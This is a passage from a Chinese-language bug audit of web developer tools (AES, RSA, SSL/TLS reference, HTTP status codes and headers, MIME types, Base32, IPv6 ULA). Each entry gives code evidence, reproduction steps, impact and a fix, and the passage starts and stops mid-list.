- 复现（Node 复算页内函数，FIPS-197 向量）：key=`000102030405060708090a0b0c0d0e0f`，明文=`00112233445566778899aabbccddeeff` → 实际密文 `f81f4bd483a531b35cce1d7781df548a`，期望 `69c4e0d86a7b0430d8cdb78070b4c55a`；再解密 → `2f22924707e907f8fe202e0cbf59b4bd`（期望回到明文）。对 16 字节输入做排列检查：`shiftRows(0..15)` 实际 `0,5,6,3,4,9,2,7,8,13,14,11,12,1,10,15`，标准应为 `0,5,10,15,4,9,14,3,8,13,2,7,12,1,6,11`；对结果再跑 `invShiftRows` 得到 `0,1,10,15,...` 而非恒等。CBC/CFB/OFB/CTR 与 Node `aes-128-*` 输出全部不一致（CBC 工具 `7eb6d701e15a3415…` vs Node `76d0627da1d29043…`）。
- 影响：页面产出的密文不是标准 AES，任何外部库（OpenSSL/Java/Node）都无法解密；本页"加密→解密"同页往返也还原不出明文，工具的加密/解密功能实际不可用。
- 方案：按 FIPS-197 重写 `shiftRows`（第 0 行不动、第 1 行左 1、第 2 行左 2 即 `2↔10`/`6↔14`、第 3 行左 3），`invShiftRows` 改为对应右移；补 FIPS-197 附录 B/C 官方向量（AES-128/192/256）自检并在发版前跑 Node 对照。

### IT-N87 AES 加密/解密：关闭 PKCS7 后分组模式静默截断，5 字节明文得到 5 字节全零密文（中，确认源码缺陷）
- 问题：`needsPadding && usePadding` 才补齐，但 `encryptCBC/ECB` 按 `new Uint8Array(plaintext.length)` 分配并按 16 字节块写入，非整块输入写不进的部分被 TypedArray 静默丢弃；解密侧按 `floor(len/16)` 处理，同样丢尾块，且无任何报错。
- 证据：`tools/it/aes-encryptor.html:834-837`（仅在勾选时补齐）、`tools/it/aes-encryptor.html:841-845`、`tools/it/aes-encryptor.html:943-948`
- 复现：模式 CBC、取消勾选"PKCS7 填充"、输入 `Hello`（5 字节）→ 实际密文长度 5、hex `0000000000`；再解密 → 长度 5、hex `0000000000`（期望提示"输入长度须为 16 的倍数"或自动补零并标注）。
- 影响：用户以为加密成功，实际得到全零/截断密文；解密端还会把残缺密文当合法输入，排查困难。
- 方案：`usePadding=false` 时先校验 `plaintext.length % 16 === 0`（ECB/CBC）与密文整块长度，不满足直接 toast 报错；`encryptCBC` 输出分配 `numBlocks*16`，不要用明文长度分配。

### IT-N88 AES 加密/解密：ECB 模式勾选"输出包含 Salt/IV"后无法解密（中，确认源码缺陷）
- 问题：加密在 ECB 下仍会拼接 `salt:cipher`（`iv` 为 null 只留 salt），但解密仅在 `mode !== 'ECB'` 时拆分冒号元数据；ECB 把整串 `saltHex:cipherHex` 交给 `hexToBytes()`，冒号与错位导致字节错乱（Base64 分支则因 `:` 让 `atob` 抛错）。
- 证据：`tools/it/aes-encryptor.html:850-857`（ECB 也拼 meta）、`tools/it/aes-encryptor.html:890-907`（`if(mode !== 'ECB')` 才拆）、`tools/it/aes-encryptor.html:913`（整串 `hexToBytes`）
- 复现：ECB + 密码模式（自动生成 Salt）+ 勾选"输出包含 Salt/IV"，加密得 `a1b2c3d4:<64位hex>`；点解密 → 实际把整串按 hex 解析，`hexToBytes('aabb:ccdd')` 复算为 `[10,171,11,204,221]`（含 `:` 的位置产生错字节），解出乱码（期望剥离 salt 后解出原文）。
- 影响：自带元数据的密文只能在本页"碰巧"解密（非 ECB），ECB 下完全不可用；用户会误判密钥/密文错误。
- 方案：ECB 不拼 IV、Salt 元数据单独字段或在解密时统一先剥离 `元数据前缀`；`hexToBytes` 增加非法字符校验（遇到 `:` 直接报错）。

### IT-N89 AES 加密/解密：文件按钮把文件转成 Base64 再加密，等于二次编码且无法还原文件（中，确认源码缺陷）
- 问题：`handleFile()` 读文件后写入 `#input` 的是 `bytesToBase64(bytes)` 文本，随后加密对这段 Base64 文本做 UTF-8 编码；解密只把明文回填到文本框，页面没有任何"另存为原文件"的下载入口，`currentFile` 仅用于显示文件名。
- 证据：`tools/it/aes-encryptor.html:988-1006`（1002 写入 Base64）、`tools/it/aes-encryptor.html:831-832`（`TextEncoder` 再编码）、页面无 `downloadText`
- 复现：选一个 1KB 的 `a.bin` → 输入框变为 Base64 文本；加密→解密后得到的是同一段 Base64 文本（不是原文件字节）；若想得到原文件还需再手工 Base64 解码，且本页不提供该功能。
- 影响："文件加密/解密"名实不符，密文体积翻倍且丢失二进制语义；用户无法完成文件级往返。
- 方案：文件模式直接把 `Uint8Array` 作为明文/密文（跳过 TextEncoder），解密后提供"下载原文件"按钮并按原文件名保存；或在 UI 明示"文件仅转为 Base64 文本，不支持还原"。

### IT-N90 AES 加密/解密：历史、图表、导出全部失效（读取 textarea 的 textContent 恒为空）（中，确认源码缺陷）
- 问题：`__aes_encryptorResText()` 取 `#output` 的 `textContent`，但结果是用 `.value` 写进 `<textarea>` 的，`textContent` 始终是空字符串；`__aes_encryptorExtras()` 拿到 `''` 直接 return，因此 `TBKit.history.record` 从不执行，"导出明细 CSV"导出的是永远空的历史表（`exportTable` 对空表返回 false 且无提示）。
- 证据：`tools/it/aes-encryptor.html:252`（`<textarea id="output" …></textarea>` 无初始文本）、`tools/it/aes-encryptor.html:1050-1053`（`r.textContent`）、`tools/it/aes-encryptor.html:1100`、`tools/it/aes-encryptor.html:1129-1131`
- 复现：加密任意文本成功、输出框有密文 → 切"历史"页签：无记录；点"导出明细 CSV"：无文件、无 toast（`exportTable` 空表直接 `return false`）。
- 影响：三块留存功能（历史、结果趋势图、导出）实际全部为空壳。
- 方案：改读 `document.getElementById('output').value`；补一条"加密→记录→历史可见→导出含一行"的回归用例。

### IT-N91 AES 加密/解密：预设回调调用 `copyResult()` 而非 `encrypt()`，点预设不会按新参数重新计算（中，确认源码缺陷）
- 问题：`TBKit.preset.bar(...)` 的 `after` 回调写成 `function(){ copyResult(); }`，而预设的作用是写入 password/keySize/mode/outputFormat；写入后既不加密也不更新结果，只把上一次的输出复制到剪贴板。
- 证据：`tools/it/aes-encryptor.html:1133-1138`（1138 行回调）
- 复现：先加密一次得到密文 A；点"AES-128·Base64"预设（会改密码与密钥长度）→ 输出框仍是 A，剪贴板却收到 A（期望按新参数重算出 B）。
- 影响：预设看起来"生效"（参数变了），但结果与参数不对应，用户会拿旧密文当新配置的产物。
- 方案：回调改为先 `encrypt()`（异步）再按需 toast；历史回填同理应重算而非复制（见 `1086` 行同类写法）。

### IT-N92 AES 加密/解密：信息栏把字符数直接标成字节数（低，确认源码缺陷）
- 问题：`updateInfo()` 把 `String.length`（UTF-16 码元数）直接拼上单位 `B`；加密传 `inputText.length/output.length`，解密传 `inputText.length`（密文字符数）与 `output.length`；`handleFile()` 更是把 `file.size`（字节）与 `base64.length`（字符）混作两栏。
- 证据：`tools/it/aes-encryptor.html:736-742`、`tools/it/aes-encryptor.html:870`、`tools/it/aes-encryptor.html:963`、`tools/it/aes-encryptor.html:1006`
- 复现：输入"中文"（UTF-8 6 字节）→ 信息栏显示"输入长度 2 B"（期望 6 B）；加载一个 1KB 文件 → "输入长度 1024 B / 输出长度 1368 B"，其中输出是 Base64 字符数而非字节数（实际同量级但口径不一）。
- 影响：以字节数评估密文长度/填充时会得到错误结论（CJK 文本差 3 倍，Base64/hex 串差 1.3–2 倍）。
- 方案：统一用 `new TextEncoder().encode(text).length` 计算，或对 hex/base64 输入先解码再计字节，并把标签明确为"字符 / 字节"。

- 留存建议（aes-encryptor）：①历史点击应"回填参数并重算"（当前只复制）；②增加密文/明文文件下载与"原文件名还原"；③内置 FIPS-197 官方向量一键自检，作为可信度卖点（修好 IT-N86 后才有意义）。

### IT-N93 RSA 加解密/签名：生成密钥的 WebCrypto usages 非法，按钮必然失败（高，确认源码缺陷）
- 问题：`generateKey({name:'RSA-OAEP', …}, true, ['encrypt','decrypt','sign','verify'])`。W3C WebCrypto 规定 RSA-OAEP 密钥只允许 `encrypt/decrypt/wrapKey/unwrapKey`，携带 `sign/verify` 直接抛 `SyntaxError`，因此"生成密钥"永远走 catch。
- 证据：`tools/it/rsa.html:422-429`（428 行 usages）、`tools/it/rsa.html:442-444`（catch 里只 toast）
- 复现（Node 18 WebCrypto，同规范）：同参数同 usages → `SyntaxError: Unsupported key usage for a RSA key`；去掉 `sign/verify` 后 `OK`。页面表现为点"生成密钥"始终弹"生成失败: …"，`lastKeys` 永为 null。
- 影响：核心入口（生成密钥对）不可用，后续"下载密钥/加密/签名"都拿不到密钥，整页演示链条断裂。
- 方案：RSA-OAEP 只保留 `['encrypt','decrypt']`；若需签名，另生成一把 `RSASSA-PKCS1-v1_5`/`RSA-PSS` 密钥（usages `['sign','verify']`），或签名时改用导入的通用 RSA 私钥（本页已用 PKCS8 导入，可行）。

### IT-N94 RSA 加解密/签名：加密算法下拉是死选项，选 SHA-512 仍按 SHA-256 执行（中，确认源码缺陷）
- 问题：`doEncrypt()` 读取 `const algo = document.getElementById('encAlgo').value` 后从未使用；`importKey`/`encrypt` 固定 `{name:'RSA-OAEP', hash:'SHA-256'}`。`doDecrypt()` 同样不读该下拉。
- 证据：`tools/it/rsa.html:450`（声明 `algo`）、`tools/it/rsa.html:455`（固定 SHA-256）、`tools/it/rsa.html:463-471`（解密固定 SHA-256）、`tools/it/rsa.html:237-240`（下拉含 `RSA-OAEP-SHA512`）
- 复现：选择 "RSA-OAEP (SHA-512)" 加密 `Hello` → 实际用 SHA-256 OAEP；把密文交给 `openssl pkeyutl -decrypt -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha512` 会失败，而用 `sha256` 成功。
- 影响：与外部系统约定 SHA-512 OAEP 时互通失败，且用户无法从结果判断实际用了哪种摘要。
- 方案：按 `algo` 映射 `{hash: algo === 'RSA-OAEP-SHA512' ? 'SHA-512' : 'SHA-256'}`，解密也读同一选项（或提供独立的解密算法下拉）。

### IT-N95 RSA 加解密/签名：点预设/历史会意外下载 `public.pem` 与 `private.pem`（中，确认源码缺陷）
- 问题：预设回调与历史回填都调用 `downloadKeys()`，而 `downloadKeys()` 只要 `lastKeys` 存在就连续下载两个 PEM 文件（间隔 200ms）。
- 证据：`tools/it/rsa.html:533-536`（下载逻辑）、`tools/it/rsa.html:645-650`（650 行预设回调）、`tools/it/rsa.html:587-601`（598 行历史回调）
- 复现：先点"生成密钥"，再点任一预设（如"4096 PSS Base64"）→ 浏览器立即下载 `public.pem`、`private.pem` 两个文件（期望仅写入参数，不产生下载）。
- 影响：误触发文件下载、把私钥落盘到默认下载目录，存在隐私/安全风险；用户也会困惑"点预设为何弹下载"。
- 方案：预设/历史回调改为调用对应的计算函数（`doEncrypt`/`doSign`）或仅回填；下载动作只保留在显式"下载密钥"按钮。

### IT-N96 RSA 加解密/签名：历史总是抓取第一个 `.result-box`，签名页结果从不入库（低，确认源码缺陷）
- 问题：`__rsaResText()` 用 `document.querySelector('.result-box')`，命中的是加密页的 `#encResult`；签名页的 `#signResult` 永远不被读取，且加密页占位文案"结果将显示在这里..."能通过过滤（不含提示词），会被当结果记录。
- 证据：`tools/it/rsa.html:562-568`、`tools/it/rsa.html:257`（`#encResult`）、`tools/it/rsa.html:301`（`#signResult`）
- 复现：切到"签名/验证"完成签名 → 历史/趋势里记录的是加密页占位文本（或上一次加密结果），签名值缺失。
- 影响：历史与趋势图无法反映签名操作，导出内容误导。
- 方案：按当前激活页签选择结果容器（`#tab-enc`→`#encResult`、`#tab-sign`→`#signResult`），并把"结果将显示在这里..."加入空态过滤。

- 留存建议（rsa）：①修好后提供"生成密钥 → 一键跑通加密/解密/签名/验签"的演示流程；②显示密钥指纹与位数，支持粘贴 PEM 自动识别 PKCS#1/PKCS#8；③提供与 OpenSSL 命令互操作的说明与示例。

### IT-N97 SSL/TLS 知识速查：中文说"浏览器无法读取远程证书"，英文却说"从主机读取证书详情"（中，确认源码缺陷）
- 问题：同一 `<p>` 的中文 `data-zh` 明确写"纯前端静态工具…浏览器无法直接读取远程证书…请用锁图标或 openssl s_client"，而英文正文承诺 "Decode and inspect SSL/TLS certificate details (issuer, validity, SAN) from a host in your browser."；页面实际没有任何主机输入与证书读取能力。
- 证据：`tools/it/ssl-info.html:155-157`
- 复现：`?lang=en-US` 打开页面 → 简介宣称可读取远程证书；页内无 host/URL 输入，只有"知识速查 + 强度估算器"两个页签（期望英文与中文同义，或提供 PEM 粘贴解析）。
- 影响：英文用户按说明寻找"输入域名看证书"功能而找不到，信任受损；也是 SEO 描述与实际功能不符。
- 方案：英文改为与中文一致的静态说明（"reference only; use the address-bar lock icon or openssl s_client"）；若想兑现该描述，另加"粘贴 PEM 证书离线解析 SAN/有效期/颁发者"。

### IT-N98 SSL/TLS 知识速查：预设条重复，且其中一条标签被截断成"…"（中，确认源码缺陷）
- 问题：正文手写了一条 `data-tb="preset"`，标签是生成时被截断的 `"算力（次/秒）：1000000000000·算法类型：ae…"`；同时脚本又调用 `TBKit.preset.bar('#ssl_infoPresets', …)`，而页面没有该 id，`preset.ensureHost` 会在第一个 `input[type=number]`（`#calcSpeed`）前自动新建宿主，于是同一页出现两条预设栏，手写那条永远显示省略号。
- 证据：`tools/it/ssl-info.html:295`（截断标签）、`tools/it/ssl-info.html:575-577`（脚本预设）、`js/tool-kit.js:1013-1031`（缺宿主时自动建）
- 复现：打开"强度估算器" → 预设区出现两组按钮（一组"默认参数/…"，另一组"默认参数/AES-256/…"），其中第一组首个按钮文字以 `ae…` 结尾（期望仅一条预设、标签完整）。
- 影响：UI 重复且出现裸省略号，像未完成的占位内容；也浪费首屏高度。
- 方案：删除 295 行手写 `data-tb="preset"`（或改成 `id="ssl_infoPresets"` 的宿主并删脚本重复注册），标签用完整中文"算力 1e12 次/秒 · AES-128"。

### IT-N99 SSL/TLS 知识速查：破解耗时取整越界，364.99 天显示成"12 个月"（低，确认源码缺陷）
- 问题：各档位先按上限判断再 `Math.round`，临界值会跨档：`sec=31,535,999`（差 1 秒满一年）→ `Math.round(31535999/2592000)=12` → "12 个月"；`sec=59.7` → "60 秒"；`sec=86,399` → "24 小时"。
- 证据：`tools/it/ssl-info.html:450-464`（453/454/455/457 行）
- 复现（Node 复算页内 `formatTime`）：`formatTime(31535999)` → 实际 `12 个月`（期望 `1 年`）；`formatTime(59.7)` → `60 秒`（期望 `1 分钟`）；`formatTime(86399)` → `24 小时`（期望 `1 天`）。
- 影响：估算结果在临界点自相矛盾（"12 个月"却 <1 年），降低可信度。
- 方案：先对秒数做向下取整到目标单位再判档，或在 `Math.round` 后若达到下一档阈值则进位；补 59.5/3599/86399/31535999 边界用例。

### IT-N100 SSL/TLS 知识速查：算力输入不校验正数，负数会得到"< 1 秒"却判"不安全"（低，确认源码缺陷）
- 问题：`parseFloat(...) || 1` 只兜底空值/0/NaN，负数原样进入 `sec = avg / speed`，得到负时间；`formatTime` 落进 `sec < 1` 分支输出"< 1 秒"，安全分级落到"❌ 不安全"。
- 证据：`tools/it/ssl-info.html:412`、`tools/it/ssl-info.html:432-438`、`tools/it/ssl-info.html:452`
- 复现：算法 AES-128、算力输入 `-100` → 实际"破解耗时 < 1 秒 / 不安全"（期望提示"算力必须为正数"或按 1 次/秒计算并标注）。
- 影响：负时间在语义上不可能，结果自相矛盾；用户可能误以为工具算错。
- 方案：`const speed = parseFloat(...); if (!(speed > 0)) { toast/提示; 回退 1 }`；同时把 `min="1"` 的约束在 JS 侧执行（浏览器只拦 spinner，手输可绕过）。

- 留存建议（ssl-info）：①增加"粘贴 PEM 证书离线解析"（SAN/有效期/颁发者/密钥用法），比纯口诀更实用；②强度估算增加"所需算力/电费量级"与"推荐算法"结论；③补 SSL3/TLS1.0-1.3 对照与常见配置错误清单，并提供可复制的 Nginx 配置片段。

### IT-N101 HTTP 状态码速查：宣称"全部标准状态码"，实际仅 32 条且漏掉正文自己引用的 203（中，确认源码缺陷）
- 问题：meta/og/twitter 描述均写"汇总 1xx~5xx 全部标准状态码"，但 `statusCodes` 只有 32 条；缺 103、203、205、300、303、305、411、412、414、416、417、418、421、425、426、428、431、451、506、507、508、510 等常用/标准码。正文引据表还专门举例"203 非权威响应"，列表里却搜不到。
- 证据：`tools/it/http-status.html:10`（meta 声明）、`tools/it/http-status.html:283-322`（32 条数据）、`tools/it/http-status.html:257`（引据 203）、无 203/451 条目
- 复现：搜索 `451`（RFC 7725 法定禁播）→ 实际"无匹配状态码 0 条"；搜索 `203` → 同样 0 条，而页面引据表第 257 行刚提到它。
- 影响：SEO 承诺与内容不符；开发者查 451/428/431 等常见码查不到，需另找资料。
- 方案：补齐至少 103/203/205/300/303/411/412/414/416/417/418/421/425/426/428/431/451/506/507/508/510，或把文案改为"常用状态码速查（32 条）"；补 203 与 451 的搜索用例。

### IT-N102 HTTP 状态码速查：401 卡片写"未授权"，与 FAQ/概览的"未认证"自相矛盾（低，确认源码缺陷）
- 问题：列表卡片 `desc:'未授权'`，而概览写"401 未认证"，FAQ 又明确"401 Unauthorized 表示『未认证』…403 已认证但无权限"。同一页对 401 给出两种中文名。
- 证据：`tools/it/http-status.html:303`（`desc:'未授权'`）、`tools/it/http-status.html:176`（概览"401 未认证"）、`tools/it/http-status.html:232`（FAQ"未认证"）
- 复现：搜索 401 → 卡片显示"401 Unauthorized 未授权"；往下读 FAQ 却说应为"未认证"（期望统一为"未认证（Unauthorized）"）。
- 影响：正是 401/403 最易混的点，卡片用词反而强化了错误理解。
- 方案：把 303 行 desc 改为"未认证"，detail 保持；补 401/403 对比用例。

### IT-N103 HTTP 状态码速查：筛选无结果时底部冒出无表头空表格（低，确认源码缺陷）
- 问题：`#httpTable` 默认 `display:none`，`__httpExtras()` 只在 `list.length===0` 时把它设为可见并清空表头，非空时反而不显示（只在导出时显示）；于是"无匹配"场景会留下一条空白表格边框。
- 证据：`tools/it/http-status.html:198`（默认隐藏）、`tools/it/http-status.html:378-382`（382 行空列表置 `display=''`）
- 复现：搜索 `zzz` → 列表显示"无匹配状态码"，其下出现一块无表头、无行的空表格（期望保持隐藏）。
- 影响：视觉噪点，像是加载失败的表格。
- 方案：空列表时 `t.style.display='none'`；或干脆移除"无结果也显示表"的分支，导出时再按需显示。

- 留存建议（http-status）：①补 301/302/307/308 与 401/403/404/410 的决策对照表；②支持"复制整行/导出全量 CSV"（当前导出只导当前筛选且需先点导出才渲染表）；③增加常见框架默认页（Nginx/Tomcat/Spring）对应状态码的排查提示。

### IT-N104 HTTP 请求头速查：凭空编造 `Range-Unit` 请求头并单列"范围"分类（中，确认源码缺陷）
- 问题：条目 `Range-Unit: <unit>` / `Range-Unit: bytes` 在 RFC 9110 中不存在；范围单位由 `Range: bytes=…` 与 `Accept-Ranges: bytes` 表达。页面为它单开"范围"分类（仅此一条），会让人以为存在独立字段。
- 证据：`tools/it/http-headers.html:915-920`（条目与示例）、`tools/it/http-headers.html:499-506`（正确的 `Accept-Ranges`）、`tools/it/http-headers.html:491-498`（`Range`）
- 复现：搜索 `Range-Unit` → 返回该条目及 `Range-Unit: bytes` 示例；按 RFC 9110 §14 检索无此字段（期望标注"非标准/常见误写"，或删除并把示例并入 `Range`）。
- 影响：把错误字段教给用户，照抄会写出服务端不识别、代理可能拒绝的请求头。
- 方案：删除该条并把 `bytes` 单位说明并入 `Range`/`Accept-Ranges`；若保留则明确标为"非标准（不存在此字段）"。

### IT-N105 HTTP 请求头速查：缺最常用的缓存与安全头，"缓存"分类只剩 Vary（中，确认源码缺陷）
- 问题：91 条中没有任何 `Cache-Control`、`Last-Modified`、`Strict-Transport-Security`、`Content-Security-Policy`、`Permissions-Policy` 的独立条目；`ETag`、`Expires` 只作为 `If-Match`/`If-None-Match`、`Set-Cookie`/`Trailer` 的示例串出现，查不到词条。"缓存"分类只有 `Vary` 一条。
- 证据：`tools/it/http-headers.html:547-554`（缓存分类唯一 Vary）、`tools/it/http-headers.html:683-690`（安全分类有 X-Frame-Options，但缺 HSTS/CSP）、`tools/it/http-headers.html:509-519`（ETag 仅作为 If-Match/If-None-Match 的参数）
- 复现：搜索 `Cache-Control` → 0 条；搜索 `ETag` → 0 条词条（仅 509/517 行的 If-* 参数里出现字符串）；搜索 `Content-Security-Policy` → 0 条（期望至少给出语法与常见指令）。
- 影响：最常被查阅的缓存协商/安全响应头缺失，用户仍需另找资料，降低留存。
- 方案：补 `Cache-Control`（含 `no-store/max-age/s-maxage/immutable`）、`ETag`/`If-None-Match`、`Last-Modified`/`If-Modified-Since`、`Expires`、`HSTS`、`CSP`、`Permissions-Policy`，并把 `Vary` 归入"缓存/协商"。

### IT-N106 HTTP 请求头速查：中文标题只写"请求头"，条目却含大量响应头（低，确认源码缺陷）
- 问题：`<h1 class="sr-only">`、面包屑、`<title>` 均称"HTTP 请求头速查"，但数据里含 `Server`、`X-Powered-By`、`Allow`、`WWW-Authenticate`、`Set-Cookie` 等响应头（英文简介写的是 "request and response headers"，反而准确）。
- 证据：`tools/it/http-headers.html:143`（h1）、`tools/it/http-headers.html:159`（面包屑）、`tools/it/http-headers.html:939-969`（响应分类 4 条）、`tools/it/http-headers.html:339`（Set-Cookie 亦为响应头）、`tools/it/http-headers.html:175`（英文简介含 response）
- 复现：页面标题显示"HTTP 请求头速查"，但列表可筛出"响应"分类 4 条（Server/X-Powered-By/X-AspNet-Version/X-UA-Compatible）。
- 影响：中文用户对收录范围预期不一致；也更难理解"响应头为何在请求头表里"。
- 方案：中文统一为"HTTP 请求/响应头速查"（含 `<title>`、h1、面包屑、JSON-LD `name`），或增加"方向（请求/响应/通用）"标签与过滤。

- 留存建议（http-headers）：①增加"请求/响应/通用"方向过滤与 CORS/缓存/安全三组场景预设；②每条支持复制 curl/Node/fetch 片段（当前仅复制单行示例）；③补 Cache-Control/HSTS/CSP 后提供"安全响应头基线"清单。

### IT-N107 MIME 类型速查表："数据表"与"导出明细 CSV"实际是搜索历史，不是 MIME 清单，首屏导出静默无反应（中，确认源码缺陷）
- 问题：`#mime_typeTable` 由 `__mime_typeRender()` 用 `TBKit.history.list()` 渲染，列是"时间 / search / 结果（列表文本前 80 字）"；导出也导这张表。且 `init()` 在 `render` 被包装之前执行，首屏不会记录历史，此时点导出 `exportTable` 遇空表直接 `return false`，没有任何提示。
- 证据：`tools/it/mime-type.html:169`（`#mime_typeTable` 位置）、`tools/it/mime-type.html:407-417`（历史行）、`tools/it/mime-type.html:473-475`（导出该表）、`tools/it/mime-type.html:369`（`init()` 早于 480-483 的包装）
- 复现：打开页面不做任何操作 → 点"导出明细 CSV"：无文件、无 toast（期望导出当前 MIME 清单）；先搜索 `json` 再点"数据表" → 表格只有"时间 / search / 结果"三列，结果列是把整段列表压平后截取前 80 字（形如 `json application/json 复制 …`），不是结构化的"扩展名｜MIME"两列（期望是完整 MIME 数据表）。
- 影响：导出内容语义错误且首屏像坏按钮；用户拿到的 CSV 无法当 MIME 映射使用。
- 方案：`数据表` 直接渲染 `MIME`（扩展名/MIME/分类），导出该表；搜索历史可另设"历史"页签（当前历史页签已存在）；空表导出给 toast。

### IT-N108 MIME 类型速查表：搜索词不 trim，前导空格导致 0 条（低，确认源码缺陷）
- 问题：`const q = …value.toLowerCase()` 未 `trim()`，过滤用 `m.ext.includes(q) || m.mime.toLowerCase().includes(q)`；粘贴时常见的行首/行尾空格会让结果全空。
- 证据：`tools/it/mime-type.html:354-357`
- 复现：搜索框输入 `" json"`（前导空格）→ 实际"共 0 条"（期望与 `json` 相同，命中 `.json`/`application/json`）。
- 影响：复制粘贴搜索词时误判"没有该类型"。
- 方案：`q = value.trim().toLowerCase()`；补前导/尾随空格用例。

### IT-N109 MIME 类型速查表：个别映射过时/分类不当（低，确认源码缺陷）
- 问题：`.exe` 给 `application/x-msdownload`（IANA 已注册 `application/vnd.microsoft.portable-executable`）；`.ai` 给 `application/postscript`（现代 Illustrator 文件实为 PDF 容器，常见为 `application/pdf` 或 `application/illustrator`）；`.m3u8` 归"视频"（实际是 HLS 播放列表 `application/vnd.apple.mpegurl`）。
- 证据：`tools/it/mime-type.html:313`（exe）、`tools/it/mime-type.html:339`（ai）、`tools/it/mime-type.html:292`（m3u8）
- 复现：查 `.exe` → 显示 `application/x-msdownload`（期望注册值或标注"非注册常用值"）；查 `.ai` → `application/postscript`（与服务端实际收到的 PDF 头不符）。
- 影响：按表配置 `Content-Type` 时可能触发下载/嗅探差异；`.ai` 上传校验可能被误判。
- 方案：改用注册值并保留常见别名（如 `application/vnd.microsoft.portable-executable`）；`.ai` 标注"PDF 兼容，推荐 application/pdf"；`.m3u8` 移入"其他/流媒体"。

- 留存建议（mime-type）：①提供"反向查询"（输入 `application/json` → 推荐扩展名）；②数据表按分类分组并支持导出全量 CSV；③每条给 Nginx/Apache 的 `types` 配置片段一键复制；④补 `charset`/`nosniff` 配置示例。

### IT-N110 Base32 编解码：解码不校验长度、填充数与残余位，损坏输入被静默还原为错误内容（中，确认源码缺陷）
- 问题：`base32ToBytes()` 只校验字符是否在字母表内，去掉所有尾部 `=` 后不检查合法长度（mod 8 只能为 0/2/4/5/7）、不检查 `=` 的个数、也不检查最后一个字符的低位（残余位）是否全 0，剩余位直接丢弃。
- 证据：`tools/it/base32-encode.html:271-284`（272 行剥填充、无长度/残余位校验）
- 复现（Node 复算页内函数）：`MZXW6YQ` 与 `MZXW6YR` → 实际都解为 `foob`（`R` 的末 3 位为 001，应报非法/非规范）；`ABC`（长度 3 非法）→ 实际解出 1 字节 `0x00`；`A`（长度 1 非法）→ 实际空串且无报错；`ME=======`（7 个等号，合法应为 6 个）→ 实际解出 `a`。
- 影响：截断/篡改/错误填充的 Base32 被当成合法数据，输出看似正常但语义错误（用于 OTP/DNS/配置时尤其危险）。
- 方案：剥填充前先记录 `=` 数量并按长度校验（2→6 个、4→4 个、5→3 个、7→1 个、0→0 个）；解码后校验残余位必须为 0；非法长度/残余位抛"非规范 Base32"；补上述四组用例。

### IT-N111 Base32 编解码：历史、趋势图、导出全为空壳（读取 textarea 的 textContent 恒为空）（中，确认源码缺陷）
- 问题：`__base32_encodeResText()` 读 `#output` 的 `textContent`，而结果写入的是 `.value`，`textContent` 永远为空 → `__base32_encodeExtras()` 直接 return，`history.record` 从不执行；导出目标是这张永远空的历史表，`exportTable` 返回 false 且无提示。解码操作也未包装 `decode32`，同样不入历史。
- 证据：`tools/it/base32-encode.html:173`（空的 `<textarea id="output">`）、`tools/it/base32-encode.html:342-345`、`tools/it/base32-encode.html:421-423`、`tools/it/base32-encode.html:428-433`（只包装 `encode32`）
- 复现：编码 `Hello` → 输出 `JBSWY3DP`；切"历史"页签无记录；点"导出明细 CSV"无文件无提示（期望一行记录并可导出）。
- 影响：三块留存/导出功能全部失效，且解码历史永远缺失。
- 方案：改读 `.value`；同时包装 `decode32` 并把"方向（编码/解码）"作为记录字段；补编码/解码各一条历史用例。

### IT-N112 Base32 编解码："预设"页签为空白（函数体是空的）（低，确认源码缺陷）
- 问题：页签栏渲染了"预设"（`data-pane="pre"`），宿主 `#base32_encodePresets` 也存在，但 `__base32_encodePresets()` 只有 `typeof TBKit` 判断，没有任何预设数据。
- 证据：`tools/it/base32-encode.html:141`（预设页签）、`tools/it/base32-encode.html:425-427`（空实现）、`tools/it/base32-encode.html:159`（宿主 div）
- 复现：点"预设"页签 → 面板空白（期望至少"Hello/中文/二进制字节"等样例，或移除该页签）。
- 影响：空页签像功能未完成。
- 方案：补 2–3 条预设（如 `Hello`、`中文测试`、`noPad` 示例），或删掉该页签。

- 留存建议（base32-encode）：①补 Base32hex / Crockford / z-base-32 的字母表对照与切换（页面已提"不可混用"）；②结果区显示字符数/填充数（当前无任何统计）；③提供编码→解码一键往返校验与非法样例提示。

### IT-N113 IPv6 ULA 生成器：预设"生成 50 个"被静默截断为 20，与自身公式"1 到 20"矛盾（中，确认源码缺陷）
- 问题：`calcTool()` 把数量夹到 `Math.min(Math.max(...,1),20)`，而预设里写了"生成 50 个"（`values:{cnt:50}`）；点击后只生成 20 条，按钮标签与实际结果不一致，且无任何提示。
- 证据：`tools/it/ipv6-ula.html:216`（上限 20）、`tools/it/ipv6-ula.html:334`（预设 50）、`tools/it/ipv6-ula.html:106`（公式自称"1 到 20"）
- 复现：点"生成 50 个" → 结果标题"生成的 IPv6 ULA（20 个）"、正文 20 行（期望 50 行，或预设改为"生成 20 个"并提示上限）。
- 影响：预设名实不符，用户以为批量生成能力有 50 条，实际少 60%。
- 方案：删除 50 条预设或把上限提高到 50（并同步公式/说明）；若保留 20 上限，夹取时 toast 说明"最多 20 个"。

### IT-N114 IPv6 ULA 生成器：用 `Math.random` 生成 40 位全局 ID，与引据表"RFC 4086 随机源"不符（中，确认源码缺陷）
- 问题：`h()` 逐位调用 `Math.floor(Math.random()*16)`，不是密码学安全随机源；引据表明确写"40-bit random global ID from a RFC 4086 source"。RFC 4193 §3.2.2 要求使用 RFC 4086 质量的随机数，`Math.random` 可预测且熵有限。
- 证据：`tools/it/ipv6-ula.html:217`（`Math.random`）、`tools/it/ipv6-ula.html:147`（RFC 4086 引据）
- 复现：同一会话连续刷新/生成，序列由浏览器 PRNG 决定、可由种子推断；无法证明满足 RFC 4086（期望 `crypto.getRandomValues`）。
- 影响：工具宣称符合 RFC 4193 的随机性建议，实际不满足；多站点互聯时冲突/可预测风险高于标称。
- 方案：改用 `crypto.getRandomValues(new Uint8Array(5))` 生成 40 位（5 字节）并格式化为 10 个 hex；或在文案中降级说明"演示用伪随机"。

### IT-N115 IPv6 ULA 生成器：说明文字把 fd 写成 9 位二进制，deep-dive 又称"48 位全局 ID"（低，确认源码缺陷）
- 问题：结果下方写"第 8 位固定为 fd，即二进制 `1111 1101 0` + 全局 ID 40 位 + 子网 16 位"：`fd` 是 8 位 `1111 1101`，多写一个 `0` 变成 9 位；deep-dive 又写"48 位全局 ID 随机"（实际 40 位，且 /48 前缀 = 8+40）。
